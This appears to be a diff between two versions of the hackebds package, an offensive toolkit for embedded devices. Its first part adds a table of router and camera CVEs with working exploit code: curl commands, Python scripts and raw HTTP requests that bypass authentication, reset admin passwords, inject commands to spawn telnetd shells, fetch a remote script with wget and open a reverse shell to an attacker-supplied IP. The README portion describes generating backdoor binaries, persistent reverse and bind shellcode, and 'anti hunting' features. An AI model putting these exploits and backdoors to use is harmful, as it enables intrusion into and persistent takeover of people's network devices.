+["A flaw in the authentication mechanism in the Login Panel of router D-Link DSL-3782 (A1_WI_20170303 || SWVer=\"V100R001B012\" FWVer=\"3.10.0.24\" FirmVer=\"TT_77616E6771696F6E67\") allows unauthenticated attackers to perform arbitrary modification (read, write) to passwords and configurations meanwhile an administrator is logged into the web panel.\n['http://packetstormsecurity.com/files/147708/D-Link-DSL-3782-Authentication-Bypass.html'\n'https://www.exploit-db.com/exploits/44657/']",
+"""
+#After my personal testing, if I need to use this CVE to bypass, the administrator needs to successfully log in to the device first
+curl --data "Password=[NEW_PASSWORD_SET_BY_THE_ATTACKER]" \
+--data "sessionKey=$(curl -sS http://192.168.1.1/cgi-bin/get/New_GUI/get_sessionKey.asp)" \
+http://192.168.1.1/cgi-bin/New_GUI/Set/Admin.asp
+"""
+ ]
+}
+
+model_exp_dic["linksys_E2000v1"]={
+    "CVE-2023-31740":
+    ["There is a command injection vulnerability in the Linksys E2000 router with firmware version 1.0.06. If an attacker gains web management privileges, they can inject commands into the post request parameters WL_atten_bb, WL_atten_radio, and WL_atten_ctl in the apply.cgi interface, thereby gaining shell privileges.\n['https://github.com/D2y6p/CVE/blob/main/Linksys/CVE-2023-31740/Linksys_E2000_RCE.pdf\n']",
+"""
+# Through my analysis of the program, I have found a way to bypass authentication and upgraded this vulnerability to unauthenticated command execution. If you have any questions, please contact doudoudedi233@gmail.com
+# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+import requests
+# Press the green button in the gutter to run the script.
+if __name__ == '__main__':
+    print('start !!! ')
+
+    target = input("Enter Target IP : ")
+    cmd = input("Enter you want cmd : ")
+
+    #cmd_url_encode = urllib.parse.quote(cmd)
+    session = requests.session()
+
+    burp0_url = "http://" + target + ":80/apply.cgi?main.js&main.js="
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
+                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                     "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + target,
+                     "Connection": "close",
+                     "Referer": "http://" + target + "/apply.cgi",
+                     "Upgrade-Insecure-Requests": "1"}
+    burp0_data = {"submit_button": "WL_WPATable", "change_action": '', "submit_type": '', "gui_action": "Apply",
+                  "security_mode_last": '', "wl_wep_last": '', "wait_time": "3", "wps_nwkey": "1231231123123123",
+                  "wl_wps_mode": "enabled", "wps_security_auto": "1", "nvset_cgi": "wireless", "wl_crypto": "tkip",
+                  "security_mode2": "wpa_personal", "wl_wpa_psk": "1231231123123123",
+                  "WL_atten_bb": "`" + cmd + "`", "WL_atten_radio": "123", "WL_atten_ctl": "123"}
+    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+    print("end !!! ")
+# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+"""
+    ]
+}
+
+model_exp_dic["GO-RT-AC750"] = {
+    "CVE-2023-26822":
+    ["D-Link Go-RT-AC750 revA_v101b03 was discovered to contain a command injection vulnerability via the service parameter at soapcgi.main.\n['https://github.com/yzskyt/Vuln/blob/main/Go-RT-AC750/Go-RT-AC750.md']\n",
+"""
+from socket import *
+from os import *
+from time import *
+import sys
+'''
+all command
+        [, [[, arp, arping, basename, bunzip2, bzcat, bzip2, cat, chmod, cp, cut,
+        date, echo, egrep, expr, false, fgrep, free, grep, gunzip, gzip, halt,
+        hostname, ifconfig, init, insmod, ip, ipaddr, iplink, iproute, iprule,
+        iptunnel, kill, killall, killall5, ln, ls, lsmod, mkdir, mknod, modprobe,
+        mount, msh, mv, netstat, ping, ping6, poweroff, ps, pwd, reboot, rm, rmmod,
+        route, sed, sh, sleep, sysctl, tar, test, top, touch, tr, true, tunctl,
+        umount, uname, uptime, vconfig, vi, wc, yes, zcat
+
+'''
+if len(sys.argv)!=2:
+	print("Parameter error. python exp.py cmd")
+	exit(0)
+cmd = sys.argv[1]
+request = f"POST /soap.cgi?service=&&{cmd}& HTTP/1.1\\r\\n".encode()
+request += b"Host: localhost:49152\\r\\n"
+request += b"Content-Type: text/xml\\r\\n"
+request += b"Content-Length: 88\\r\\n"
+request += b"SOAPAction: a#b\\r\\n\\r\\n"
+ 
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((gethostbyname("192.168.0.1"), 49152))
+s.send(request)
+ 
+#sleep(10)
+#system('telnet 192.168.0.1 4123')
+"""     
+     ]
+}
+
+model_exp_dic["TP-Link_Archer_VR1600V"] = {
+    "CVE-2023-31756":
+    ["A command injection vulnerability exists in the administrative web portal in TP-Link Archer VR1600V devices running firmware Versions <= 0.1.0. 0.9.1 v5006.0 Build 220518 Rel.32480n which allows remote attackers, authenticated to the administrative web portal as an administrator user to open an operating system level shell via the 'X_TP_IfName' parameter.\n['https://stanleyjobsonau.github.io/tp-link-advisory.html']\n",
+"""
+POST /cgi?2 HTTP/1.1
+Host: 192.168.1.1
+User-Agent: python-requests/2.20.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+TokenID:
+Referer: http://192.168.1.1/
+Cookie: JSESSIONID=
+Content-Length: 81
+
+[WAN_IP_CONN#1,7,1,0,0,0#0,0,0,0,0,0]0,2
+X_TP_IfName=;telnetd -l sh;
+enable=1
+"""     
+]
+}
+
+model_exp_dic["TL-WPA4530_KIT_V2"] = {
+    "CVE-2023-31700":
+    ["TP-Link TL-WPA4530 KIT V2 (EU)_170406 and V2 (EU)_161115 is vulnerable to Command Injection via _httpRpmPlcDeviceAdd.\n['https://github.com/FirmRec/IoT-Vulns/blob/main/tp-link/postPlcJson/report.md']\n",
+"""
+POST /admin/powerline?form=plc_add HTTP/1.1
+Host: 192.168.100.2
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 68
+Origin: http://192.168.100.2
+Connection: close
+Referer: http://192.168.100.2/
+Cookie: Authorization=XXXXXXX
+
+xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;
+"""
+     ]
+}
+
+model_exp_dic["iptime_c200"] = {
+    "CVE-2021-26614":
+["ius_get.cgi in IpTime C200 camera allows remote code execution. A remote attacker may send a crafted parameters to the exposed vulnerable web service interface which invokes the arbitrary shell command.\n['https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346']\n",
+ """
+
+ """]
+}
+
+
+model_exp_dic["tenda_cpx"] = {
+    "CVE-2023-23080":
+["Certain Tenda products are vulnerable to command injection. This affects Tenda CP7 Tenda CP7<=V11.10.00.2211041403 and Tenda CP3 v.10 Tenda CP3 v.10<=V20220906024_2025 and Tenda IT7-PCS Tenda IT7-PCS<=V2209020914 and Tenda IT7-LCS Tenda IT7-LCS<=V2209020914 and Tenda IT7-PRS Tenda IT7-PRS<=V2209020908.\n['https://github.com/fxc233/iot-vul/tree/main/Tenda/IPC']\n",
+"""
+from time import sleep
+import requests
+import socket
+import sys
+import os
+
+
+if __name__ == "__main__":
+	TARGET_IP = sys.argv[1]
+	SHELL_PORT = sys.argv[2]
+
+	SHELL_OPERATION = "<SYSTEMEX>telnetd -p %s -l /bin/sh &</SYSTEMEX>" % SHELL_PORT
+
+	print("\\x1b[01;38;5;214m[+] Connect to target ip\\x1b[0m")
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((TARGET_IP,1300))
+	sleep(0.5)
+
+	print("[+] Sending payload to %s ..." % TARGET_IP)
+	s.send(SHELL_OPERATION.encode())
+	
+	s.recv(1024)
+	sleep(1)
+	
+	print("\x1b[01;38;5;1m[+] Successfully connect to Port %s\\x1b[0m" % SHELL_PORT)
+	os.system("telnet %s %s" % (TARGET_IP,SHELL_PORT))
+	
+	s.close()
+"""
+ 
+ ]
+}
+
+model_exp_dic["Netgear_R9000"] = {
+    "CVE-2019-20760":
+    ["NETGEAR R9000 devices before 1.0.4.26 are affected by authentication bypass.\n['https://kb.netgear.com/000060639/Security-Advisory-for-Authentication-Bypass-on-R9000-PSV-2018-0615']\n",
+"""
+#!/usr/bin/python3
+from threading import Thread
+import requests
+import base64
+import sys
+if len(sys.argv)!=4:
+	print("Parameter error. python exp.py host_ip reverse_ip reverse_port")
+	exit(0)
+
+host_ip = sys.argv[1]
+reverse_ip = sys.argv[2]
+reverse_port = sys.argv[3]
+
+cmd = b"admin:`mknod /tmp/a p\\ntelnet {reverse_ip} {reverse_port} 0</tmp/a | /bin/sh 1>/tmp/a 2>/tmp/a`".format(reverse_port=reverse_port, reverse_ip=reverse_ip)
+assert(len(cmd) < 255)
+
+cmd_b64 = base64.b64encode(cmd).decode()
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Authorization": "Basic {}".format(cmd_b64) 
+}
+
+def attack():
+    try:
+        rep = requests.post("http://{host_ip}/cgi-bin/".format(host_ip=host_ip), headers=headers, timeout=1)
+        print(rep.text)
+    except Exception as e:
+        print(e)
+
+attack()
+"""     
+     ]
+}
+
+model_exp_dic["DIR-600_vB"] = {
+    "CVE-2023-33625":
+    ["D-Link DIR-600 Hardware Version B5, Firmware Version 2.18 was discovered to contain a command injection vulnerability via the ST parameter in the lxmldbc_system() function.\n['https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md'\n'https://hackmd.io/@naihsin/By2datZD2'\n]",
+"""
+import sys
+import os
+import socket
+from time import sleep
+# Exploit By Miguel Mendez - @s1kr10s
+def config_payload(ip, port):
+    header = "M-SEARCH * HTTP/1.1\\n"
+    header += "HOST:"+ str(ip) + ":" +str(port)+"\\n"
+    header += "ST:urn:device:1;telnetd\\n"
+    header += "MX:2\\n"
+    header += 'MAN:"ssdp:discover"'+"\\n\\n"
+    return header
+def send_conexion(ip, port, payload):
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
+    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
+    sock.sendto(payload,(ip, port))
+    sock.close()
+if __name__== "__main__":
+    ip = raw_input("Router IP: ")
+    port = 1900
+    print("\\n---= HEADER =---\\n")
+    headers = config_payload(ip, port)
+    print("[+] Preparando Header ...")
+    print("[+] Enviando payload ...")
+    print("[+] Activando servicio telnetd :)") 
+    send_conexion(ip, port, headers)
+    print("[+] Conectando al servicio ...\\n")
+    sleep(5)
+    os.system('telnet ' + str(ip))
+"""     
+     ]
+}
+
+model_exp_dic["DIR-823G_A1"] = {
+    "CVE-2023-26615":
+    ["D-Link DIR-823G firmware version 1.02B05 has a password reset vulnerability, which originates from the SetMultipleActions API, allowing unauthorized attackers to reset the WEB page management password.\n['https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1'\n'https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1/SetMultipleActions']",
+"""
+a='`telnetd -p 8082 -l /bin/sh`' ; curl http://192.168.0.1/HNAP1 -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetPasswdSettings"' -d "'$a'" -s >/dev/null ; telnet 192.168.0.1 8082
+""" 
+     ]
 }
```

### Comparing `hackebds-0.3.6/hackebds/mips.py` & `hackebds-0.3.7/hackebds/mips.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/README.md` & `hackebds-0.3.7/README.rst`

 * *Files 17% similar despite different names*

```diff
@@ -1,400 +1,487 @@
-# hackebds
+hackebds
+========
 
-![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
-[![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)
+| |image1|\ |image2|
+| |image3|
 
-:link:[中文readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)
+🔗\ `中文readme <https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md>`__
 
-## foreword
+foreword
+--------
 
->In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
+   In the process of penetration and vulnerability mining of embedded
+   devices, many problems have been encountered. One is that some
+   devices do not have telnetd or ssh services to obtain an interactive
+   shell，Some devices are protected by firewall and cannot be connected
+   to it in the forward direction Reverse_shell is required, and the
+   other is that memory corruption vulnerabilities such as stack
+   overflow are usually Null bytes are truncated, so it is more
+   troublesome to construct reverse_shellcode, so this tool was
+   developed to exploit the vulnerability. This tool is developed based
+   on the PWN module and currently uses the python2 language，\ **Has
+   been updated to python3**
 
+fuction
+-------
 
+This tool is embedded in the security test of the device. There are two
+main functions:
 
-## fuction
+1. Generate **backdoor programs** (only ELF) of various architectures.
+   The backdoor program is packaged in shellless pure shellcode and is
+   smal，Pure static backdoor .\ **Armv5, Armv7, Armv8, mipsel,
+   mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32 are
+   now supported, and they are still being updated** (PS:bash support is
+   added to the reverse shell after version 0.3.1). If the backdoor of
+   the reverse shell is generated with the - power parameter, the
+   reverse shell will continue to be generated on the target machine)
 
+2. Generate **reverse_shell shellcode** (only linux) of various
+   architectures during the exploit process, and no null bytes, which
+   facilitates the exploitation of memory corruption vulnerabilities on
+   embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64,
+   mipsel64, powerpc, powerpc64,sparc are now supported, and they are
+   still being updated**
 
-This tool is embedded in the security test of the device. There are two main functions:
+3. Generate bind of various architectures bind_Shell(only ELF) file,
+   -power can persistent bind_shell
 
-1. Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
+4. Sort out the exploitable vulnerability POC or EXP of the embedded
+   device, and search and output the basic information and POC of the
+   device model in use: Function of equipment, Architecture of
+   equipment,Device CPU manufacturer,Device CPU model,WEB service
+   program of the device, and so on
 
-2. Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
+5. Support command line generation backdoor and shell code, Strong anti
+   hunting ability,characterized by light, small, efficient and fast
 
-3. Generate bind of various architectures bind_Shell file.
+install
+-------
 
-4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
+Just use pip to install, if the installation fails, try to use sudo to
+install
 
-5. Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
+.. code:: 
 
+   Use pip install:
+   pip(3) install -U hackebds
 
-## install
+   local install:
+   git clone https://github.com/doudoudedi/hackEmbedded
+   sudo ./start.sh
 
-Just use pip to install, if the installation fails, try to use sudo to install
+（If you want this tool to run on a MacOS system, you need to include
+python/bin in the bashrc environment variable）
 
-```
-Use pip install:
-pip(3) install -U hackebds
+.. code:: 
 
-local install:
-git clone https://github.com/doudoudedi/hackEmbedded
-sudo ./start.sh
-```
+   echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
 
-（If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png
+   :alt: 
 
-```
-echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
-```
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png
+   :alt: 
 
-![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)
+Instructions for use
+~~~~~~~~~~~~~~~~~~~~
 
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png
+   :alt: 
 
-![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)
+| Please install the corresponding binutils environment before use
+| expample:
 
-#### Instructions for use
+.. code:: 
 
-![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)
+   Ubuntu（debian）:
+     apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
+     apt install binutils-arm-linux-gnueabi/hirsute
+    MacOS:
+    	 https://github.com/Gallopsled/pwntools-binutils
+    	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
 
-Please install the corresponding binutils environment before use
-expample:
+1. Use the command line to generate the backdoor file name, shellcode,
+   bindshell, etc
 
-```
-Ubuntu（debian）:
-  apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
-  apt install binutils-arm-linux-gnueabi/hirsute
- MacOS:
- 	 https://github.com/Gallopsled/pwntools-binutils
- 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
-```
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png
+      :alt: 
 
-If the following error occurs
+   .. code:: 
 
-hackebds: error: argument -model: expected one argument
+      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
 
-Please set all parameters to lowercase or lowercase mixed with uppercase. I guess it is due to the conflict between python and bash in the interpretation of uppercase and lowercase letters
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png
+      :alt: 
 
-1. Use the command line to generate the backdoor file name, shellcode, bindshell, etc
+   .. code:: 
 
-   ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
+      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
 
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
-   ```
+   By default, the reverse shell backdoor is created using sh. If bash
+   is required (PS: here, the bash command needs to exist on the target
+   device)
 
-   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+   .. code:: 
 
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
-   ```
+      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
 
-   By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
+   If you need to generate a backdoor and constantly create reverse
+   shells (the CPU occupied by the test is about% 8)
 
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
-   ```
+   .. code:: 
 
-   If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
+      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
 
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
-   ```
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png
+      :alt: 
 
-   
+   .. code:: 
 
-   ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
+      hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
 
-   ```
-   hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
-   ```
+   Create bind_shell to monitor the shell as sh, -power fuction can give
+   -shell bash
 
-   Create bind_shell to monitor the shell as sh, -power fuction can give -shell bash	
+   .. code:: 
 
-   ```
-   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
-   ```
+      hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
 
-   The bind_shell process will not stop after being disconnected, and supports repeated connections (currently this function is not supported by powerpc and sparc series)
+   The bind_shell process will not stop after being disconnected, and
+   supports repeated connections (currently this function is not
+   supported by powerpc and sparc series)
 
-   ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png
+      :alt: 
 
-   
+   Generate cmd_file function is updated. Only need to specify the - cmd
+   parameter to generate programs for various architectures to execute
+   corresponding commands , -envp Environment variables are separated by
+   commas
 
-   Generate cmd_file function is updated. Only need to specify the - cmd parameter to generate programs for various architectures to execute corresponding commands , -envp Environment variables are separated by commas
+   .. code:: 
 
-   ```
-   hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
-   ```
+      hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
 
-   ![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png
+      :alt: 
 
-   The list relationship between the output model and the architecture is added to the function of generating the back door of the specified model to facilitate the user to observe and modify. The output information will be enhanced after version 0.3.5, such as (60 device information, POC40+or so):
-   Function of equipment
-   Architecture of equipment
-   Device CPU manufacturer
-   Device CPU model
-   WEB service program of the device
-   Device default SSH service support
-   Can monitoring be realized
-   Device default telnet user password
-   Device sdk support
-   Openwrt support for devices
-   Whether the device is vulnerable
-   POC output
+   | The list relationship between the output model and the architecture
+     is added to the function of generating the back door of the
+     specified model to facilitate the user to observe and modify. The
+     output information will be enhanced after version 0.3.5, such as
+     (60 device information, POC40+or so):
+   | Function of equipment
+   | Architecture of equipment
+   | Device CPU manufacturer
+   | Device CPU model
+   | WEB service program of the device
+   | Device default SSH service support
+   | Can monitoring be realized
+   | Device default telnet user password
+   | Device sdk support
+   | Openwrt support for devices
+   | Whether the device is vulnerable
+   | POC output
 
-   ```
-   hackebds -l
-   ```
+   .. code:: 
 
-   ![image-20230213151548871](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png)
+      hackebds -l
 
-   Add the retrieval of device information. Use - s to search for the - model parameter. This search is fuzzy and insensitive to case. Try to use the device information with the highest matching degree between lowercase output and input when inputting
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png
+      :alt: 
 
-   ```
-   hackebds -model ex200 -s
-   ```
+   Add the retrieval of device information. Use - s to search for the -
+   model parameter. This search is fuzzy and insensitive to case. Try to
+   use the device information with the highest matching degree between
+   lowercase output and input when inputting
+
+   If the following error occurs
+
+   hackebds: error: argument -model: expected one argument
+
+   Please set all parameters to lowercase or lowercase mixed with
+   uppercase. I guess it is due to the conflict between python and bash
+   in the interpretation of uppercase and lowercase letters
+
+   .. code:: 
+
+      hackebds -model ex200 -s
 
    If the following warning occurs during command output
 
-   /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning
-     warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')
+   | /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11:
+     UserWarning: Using slow pure-python SequenceMatcher. Install
+     python-Levenshtein to remove this warning
+   |  warnings.warn('Using slow pure-python SequenceMatcher. Install
+     python-Levenshtein to remove this warning')
+
+   If the following warning occurs during command output, you can use
+   the following command to install python-levenshtein. After
+   installation, the command retrieval speed can be increased by about 4
+   times
+
+   .. code:: 
+
+      pip install python-levenshtein
+
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png
+      :alt: 
+
+   The POC corresponding to the generated device can use - p or -- poc,
+   which may be python scripts, commands, etc., and may need to be
+   modified by yourself
+
+   .. code:: 
+
+      hackebds -model ex200 -p
+
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png
+      :alt: 
+
+   If a vulnerability is found in the test and you want to add the basic
+   information of a new device to this tool, you can use the - add
+   function for POC files or "/tmp/model_tree_info/" The format of the
+   directory directory of the new device under the info/directory can
+   refer to the standard generated format. After the insertion, you can
+   use the tool search and POC generation functions，Finally, if you
+   need to fill in the POC file information, you can put it in
+   "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved
+   again
+
+   .. code:: 
 
-   If the following warning occurs during command output, you can use the following command to install python-levenshtein. After installation, the command retrieval speed can be increased by about 4 times
+      hackebds -add
 
-   ```
-   pip install python-levenshtein
-   ```
-
-   ![image-20230213105520663](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png)
-
-   The POC corresponding to the generated device can use - p or -- poc, which may be python scripts, commands, etc., and may need to be modified by yourself
-
-   ```
-   hackebds -model ex200 -p
-   ```
-
-   ![image-20230213105925356](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png)
-
-   If a vulnerability is found in the test and you want to add the basic information of a new device to this tool, you can use the - add function for POC files or "/tmp/model_tree_info/" The format of the directory directory of the new device under the info/directory can refer to the standard generated format. After the insertion, you can use the tool search and POC generation functions，Finally, if you need to fill in the POC file information, you can put it in "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved again
-
-   ```
-   hackebds -add
-   ```
-
-   ![image-20230213111024854](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png)
-
-   If there are device information errors, POC errors, or you want to integrate your collected device information with vulnerabilities, please contact me doudoudedi233@gmail.com
-
-   
-
-2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
-
-```
->>> from hackebds import *
->>> mipsel_backdoor(reverse_ip,reverse_port)
->>> mips_backdoor(reverse_ip,reverse_port)
->>> aarch64_backdoor(reverse_ip,reverse_port)
->>> armelv5_backdoor(reverse_ip,reverse_port)
->>> armelv7_backdoor(reverse_ip,reverse_port)
->>> armebv5_backdoor(reverse_ip,reverse_port)
->>> armebv7_backdoor(reverse_ip,reverse_port)
->>> mips64_backdoor(reverse_ip,reverse_port)
->>> mips64el_backdoor(reverse_ip,reverse_port)
->>> x86el_backdoor(reverse_ip,reverse_port)
->>> x64el_backdoor(reverse_ip, reverse_port)
->>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
->>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
->>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
->>> x86_bind_shell(listen_port, passwd)
->>> x64_bind_shell(listen_port, passwd)
->>> armelv7_bind_shell(listen_port, passwd)
->>> aarch64_ bind_ shell(listen_port, passwd)
->>> mips_bind_shell(listen_port, passwd)
->>> mipsel_bind_shell(listen_port, passwd)
->>> sparc32.sparc_bind_shell(listen_port, passwd)
->>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
-```
-
-（Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
-
-```
->>> mipsel_backdoor("127.0.0.1",5566)
-[+] reverse_ip is: 127.0.0.1
-[+] reverse_port is: 5566
-[*] waiting 3s
-[+] mipsel_backdoor is ok in current path ./
->>>
-```
-
-![image-20221028144512270](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png)
-
-```
->>> from hackebds import *
->>> x86_bind_shell(4466,"doud")
-[+] bind port is set to 4466
-[+] passwd is set to 'doud'
-0x0000000064756f64
-[*] waiting 3s
-[+] x86_bind_shell is ok in current path ./
->>>
-```
+   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png
+      :alt: 
 
-![image-20221028143802937](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png)
+   If there are device information errors, POC errors, or you want to
+   integrate your collected device information with vulnerabilities,
+   please contact me doudoudedi233@gmail.com
+
+2. Generate backdoor programs of various architectures, encapsulate pure
+   shellcode, and successfully connect to the shell
+
+.. code:: 
+
+   >>> from hackebds import *
+   >>> mipsel_backdoor(reverse_ip,reverse_port)
+   >>> mips_backdoor(reverse_ip,reverse_port)
+   >>> aarch64_backdoor(reverse_ip,reverse_port)
+   >>> armelv5_backdoor(reverse_ip,reverse_port)
